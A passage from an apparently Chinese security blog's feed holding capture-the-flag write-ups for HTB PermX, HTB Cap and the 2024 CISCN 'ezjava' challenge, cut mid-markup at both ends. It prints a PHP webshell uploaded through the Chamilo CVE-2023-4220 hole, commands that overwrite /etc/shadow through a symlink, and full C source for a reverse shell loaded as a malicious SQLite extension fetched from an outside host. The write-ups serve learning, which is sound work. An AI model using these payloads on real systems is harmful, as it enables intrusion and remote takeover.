class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hosts绑定: 10.10.11.23permx.htb</span><br><span class="line"></span><br><span class="line">ffuf -c -u &#x27;http://permx.htb&#x27; -H &#x27;host: FUZZ.permx.htb&#x27; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301,302 -mc all</span><br><span class="line">__________________________________________________</span><br><span class="line">www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 1716ms]</span><br><span class="line">lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 120ms]</span><br><span class="line"></span><br><span class="line">lms绑一下hosts</span><br></pre></td></tr></table></figure><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://permx.htb</span><br><span class="line">Nothing</span><br><span class="line">dirsearch -u http://lms.permx.htb</span><br></pre></td></tr></table></figure><p>permx.htb</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240722170203735.png" alt="image-20240722170203735"></p><p>lms.permx.htb，<code>Powered by Chamilo © 2024</code>，找到相关漏洞CVE-2023-4220</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240722170057063.png" alt="image-20240722170057063"></p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>lms.permx.htb - CVE-2023-4220</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">POC</span></span><br><span class="line">echo &#x27;&lt;?php system(GET_[0]); ?&gt;&#x27; &gt; shell.php</span><br><span class="line">curl -F &#x27;bigUploadFile=@shell.php&#x27; &#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported&#x27;</span><br><span class="line"></span><br><span class="line">curl &#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?0=id&#x27;</span><br></pre></td></tr></table></figure><p>权限不够，无法读取用户文件</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240722172222942.png" alt="image-20240722172222942"></p><p>信息收集后，在&#x2F;app&#x2F;config下找到configuration.php找到数据库相关配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">// Database connection settings.</span><br><span class="line">$_configuration[&#x27;db_host&#x27;] = &#x27;localhost&#x27;;</span><br><span class="line">$_configuration[&#x27;db_port&#x27;] = &#x27;3306&#x27;;</span><br><span class="line">$_configuration[&#x27;main_database&#x27;] = &#x27;chamilo&#x27;;</span><br><span class="line">$_configuration[&#x27;db_user&#x27;] = &#x27;chamilo&#x27;;</span><br><span class="line">$_configuration[&#x27;db_password&#x27;] = &#x27;03F6lY3uXAP2bkW8&#x27;;</span><br><span class="line">// Enable access to database management for platform admins.</span><br><span class="line">$_configuration[&#x27;db_manager_enabled&#x27;] = false;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>连接数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">交互式shell</span><br><span class="line">script /dev/null -c /bin/bash</span><br><span class="line"></span><br><span class="line">mysql -uchamilo -p03F6lY3uXAP2bkW8</span><br><span class="line">MariaDB [(none)]&gt; select username,password from chamilo.user;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240722172054155.png" alt="image-20240722172054155"></p><p>没有mtz用户，随便尝试下，ssh(03F6lY3uXAP2bkW8)</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240722172456720.png" alt="image-20240722172456720"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240722172531611.png" alt="image-20240722172531611"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">三个参数</span></span><br><span class="line">if [ &quot;$#&quot; -ne 3 ]; then</span><br><span class="line">    /usr/bin/echo &quot;Usage: $0 user perm file&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">user=&quot;$1&quot;</span><br><span class="line">perm=&quot;$2&quot;</span><br><span class="line">target=&quot;$3&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">限制目录</span></span><br><span class="line">if [[ &quot;$target&quot; != /home/mtz/* || &quot;$target&quot; == *..* ]]; then</span><br><span class="line">    /usr/bin/echo &quot;Access denied.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check <span class="keyword">if</span> the path is a file</span></span><br><span class="line">if [ ! -f &quot;$target&quot; ]; then</span><br><span class="line">    /usr/bin/echo &quot;Target must be a file.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">/usr/bin/sudo /usr/bin/setfacl -m u:&quot;$user&quot;:&quot;$perm&quot; &quot;$target&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>符号链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s / s</span><br><span class="line">sudo /opt/acl.sh mtz rwx /home/mtz/s/etc/shadow</span><br></pre></td></tr></table></figure><p>生成密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 n2ryx</span><br><span class="line"># -6 SHA-512</span><br><span class="line">$6$ztkRSP3WE.Ds7q3e$FrrLxJU6LuU3hcrJkpQNSjoYWbKneWHmENF8qUQiuqZ293dkLTA08Pa946ids5NNggurZgpUiYMHMxmPHqUG7/</span><br><span class="line"></span><br><span class="line">echo &#x27;root:$6$ztkRSP3WE.Ds7q3e$FrrLxJU6LuU3hcrJkpQNSjoYWbKneWHmENF8qUQiuqZ293dkLTA08Pa946ids5NNggurZgpUiYMHMxmPHqUG7/:19871:0:99999:7:::&#x27; &gt; /home/mtz/s/etc/shadow</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240722174241797.png" alt="image-20240722174241797"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Cap</title>
      <link href="/2024/07/20/writeup/htb/HTB%20Cap/"/>
      <url>/2024/07/20/writeup/htb/HTB%20Cap/</url>
      
        <content type="html"><![CDATA[<h1 id="Cap-Linux-·-Easy"><a href="#Cap-Linux-·-Easy" class="headerlink" title="Cap (Linux · Easy)"></a>Cap (Linux · Easy)</h1><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v -T4 -Pn 10.10.10.245</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.10.245</span><br><span class="line">Host is up (1.1s latency).</span><br><span class="line">Not shown: 655 closed tcp ports (conn-refused), 342 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)</span><br><span class="line">80/tcp open  http    gunicorn</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.0 404 NOT FOUND</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Mon, 19 Aug 2024 06:33:40 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 232</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Mon, 19 Aug 2024 06:33:14 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 19386</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Security Dashboard&lt;/title&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;</span><br><span class="line">|     &lt;!-- amchar</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Mon, 19 Aug 2024 06:33:20 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Allow: GET, HEAD, OPTIONS</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 196</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">|_http-server-header: gunicorn</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.10.245</span><br><span class="line">anonymous</span><br><span class="line"># 匿名登不上</span><br></pre></td></tr></table></figure><p>http</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1724052553382.png" alt="截屏2024-08-19 15.10.01"></p><p>&#x2F;data&#x2F;7 ，此处可以下载pcap文件</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1724052616299.png" alt="截屏2024-08-19 15.21.47"></p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>猜测密码重用，连ssh</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1724052601563.png" alt="截屏2024-08-19 15.21.47"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>上传并运行 linpeas.sh ，发现python3有root权限且其他用户有执行权</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1724052567730.png" alt="截屏2024-08-19 15.21.47"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024CISCN初赛</title>
      <link href="/2024/06/20/writeup/ciscn/2024CISCN%E5%88%9D%E8%B5%9B/"/>
      <url>/2024/06/20/writeup/ciscn/2024CISCN%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2024CISCN初赛"><a href="#2024CISCN初赛" class="headerlink" title="2024CISCN初赛"></a>2024CISCN初赛</h1><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><blockquote><p>JDBC-Attack-SQLite加载恶意so文件</p></blockquote><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1727236081282.png" alt="image-20240525171429854"></p><p>分析JdbcController，<code>com.example.jdbctest.controller.JdbcController#connect</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/connect&quot;&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> ResultBean <span class="title function_">connect</span><span class="params">(<span class="meta">@RequestBody</span> JdbcBean jdbcBean)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(<span class="number">1</span>, String.join(<span class="string">&quot;,&quot;</span>, <span class="built_in">this</span>.datasourceServiceImpl.testDatasourceConnectionAble(jdbcBean)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResultBean</span>(<span class="number">0</span>, <span class="string">&quot;连接失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实例化连接测试，跟进<code>com.example.jdbctest.services.datasourceServiceImpl#testDatasourceConnectionAble</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] testDatasourceConnectionAble(JdbcBean jdbcBean) <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">    <span class="type">DatasourceLoadConfig</span> <span class="variable">var10000</span> <span class="operator">=</span> <span class="built_in">this</span>.datasourceLoadConfig;</span><br><span class="line">    Map&lt;String, String&gt; config = DatasourceLoadConfig.getConfig();</span><br><span class="line">    <span class="keyword">switch</span> (jdbcBean.getType()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-MYSQL&quot;</span>));</span><br><span class="line">            <span class="type">MysqlDatasourceConnector</span> <span class="variable">mysqlDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MysqlDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> mysqlDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> mysqlDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-POSTGRES&quot;</span>));</span><br><span class="line">            <span class="type">PostgresDatasourceConnector</span> <span class="variable">postgresDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PostgresDatasourceConnector</span>(DriverManager.getConnection(jdbcBean.getUrl()));</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> postgresDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> postgresDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="type">SqliteDatasourceConnector</span> <span class="variable">sqliteDatasourceConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqliteDatasourceConnector</span>(jdbcBean.getUrl());</span><br><span class="line">            <span class="keyword">if</span> (jdbcBean.getTableName() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> sqliteDatasourceConnector.getTableContent(jdbcBean.getTableName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sqliteDatasourceConnector.getTables();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            Class.forName((String)config.get(<span class="string">&quot;JDBC-SQLITE&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据<code>sqliteDatasourceConnector.getTableContent</code>，跟进到<code>com.example.jdbctest.services.DatasourceServiceImpl#getTableContent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String[] getTableContent(String tableName) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from &quot;</span> + tableName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建了一个Statement对象，Statement是JDBC API中用于执行SQL语句和查询数据库的一个类</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> <span class="built_in">this</span>.connection.createStatement();</span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 执行SQL查询</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; <span class="comment">// catch</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125; <span class="comment">// catch</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>思路：利用JDBC-Attack-SQLite加载恶意so文件</p><p>sqlite-jdbc-3.8.9.jar库中<code>org.sqlite.core.CoreConnection#extractResource</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1727236081740.png" alt="image-20240525215445968"></p><p>这个方法从URL连接获取数据库内容，生成在&#x2F;tmp&#x2F;sqlite-jdbc-tmp-*.db，根据<code>resourceAddr.hashCode()</code>知道生成文件名的方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://ip/evil.so&quot;</span>).hashCode());</span><br></pre></td></tr></table></figure><p>恶意文件生成 <code>c -&gt; so</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> tcp_port = <span class="number">7777</span>;</span><br><span class="line"><span class="type">char</span> *ip = <span class="string">&quot;ip&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sqlite3_extension_init</span><span class="params">(sqlite3 *db,<span class="type">char</span> **pzErrMsg,<span class="type">const</span> sqlite3_api_routines *pApi)</span>&#123;</span><br><span class="line">  <span class="type">int</span> rc = SQLITE_OK;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(tcp_port);</span><br><span class="line">    addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">    fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( connect(fd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dup2(fd, <span class="number">0</span>);</span><br><span class="line">    dup2(fd, <span class="number">1</span>);</span><br><span class="line">    dup2(fd, <span class="number">2</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译成so文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fPIC -shared evil.c -o evil.so</span><br></pre></td></tr></table></figure><p>然后需要执行<code>CREATE VIEW security as SELECT ( SELECT load_extension(&#39;/tmp/sqlite-jdbc-tmp-*.db&#39;));</code>去加载恶意的so文件</p><p>生成db文件代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 